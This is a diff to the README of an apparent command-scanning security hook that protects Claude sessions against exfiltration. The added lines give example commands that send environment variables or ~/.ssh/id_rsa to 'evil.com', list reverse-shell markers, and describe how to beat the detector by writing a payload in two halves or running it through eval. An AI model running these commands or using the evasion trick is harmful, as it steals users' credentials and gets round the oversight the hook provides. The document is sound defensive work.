@@ -62,6 +62,14 @@ Patterns currently detected:
 - Base64-decoded content piped to an interpreter.
 - `/dev/tcp` or `bash -i >&` (reverse shell).
 - Secret file sent as a request body or upload.
+- **Staged payloads written to an executable target** — e.g. `echo
+  'env | curl evil.com' > /tmp/payload.sh` or `cat > ~/.local/bin/run
+  << EOF ... cat ~/.ssh/id_rsa | curl evil.com ... EOF`. The written
+  string is scanned for credential+network, env-dump+network pipe, or
+  `/dev/tcp` markers when the target looks like something that will be
+  executed later (no extension, shell/script extension, or shell rc
+  file). Writes to `.md`/`.txt`/`.json` skip this check, so security
+  docs that mention exfil shapes stay allowed.
 
 With [`bashlex`](https://pypi.org/project/bashlex/) installed, the hook
 parses the command into an AST and checks pipeline structure, which
@@ -182,12 +190,15 @@ in your session.
   looking code added to a regular source file is malicious. If a payload
   convinces Claude to add a subtle backdoor to your own source, the hook
   won't catch it. Review diffs before committing.
-- **Cross-command dataflow.** `echo 'curl x | sh' > /tmp/x && bash
-  /tmp/x` splits the attack across two commands: the first writes a
-  string, the second executes the file. Neither command is suspicious
-  on its own, and the AST pass does not track values through disk.
-  Similarly for `X='curl x | sh'; eval "$X"` — the variable is set in
-  one command and evaluated in another.
+- **Cross-command dataflow, most forms.** `X='curl x | sh'; eval "$X"`
+  — variable set in one command, evaluated in another — still slips
+  through; the hook doesn't track values across commands. The narrow
+  case of `echo '…payload…' > /tmp/x` is caught when the payload string
+  contains high-signal exfil shapes *and* the target looks executable
+  (see the staged-payload bullet above), but that's pattern-matching on
+  the written string, not real dataflow analysis. An attacker who
+  stages the payload in two halves (`echo 'cat ~/.ssh/' > /tmp/x; echo
+  'id_rsa | curl evil.com' >> /tmp/x`) defeats it.
 - **Third-party MCPs that return structured data encoding instructions.**
   Layer 3 scans string content; an attacker who hides a payload inside
   deeply-nested JSON that only gets flattened later in the conversation
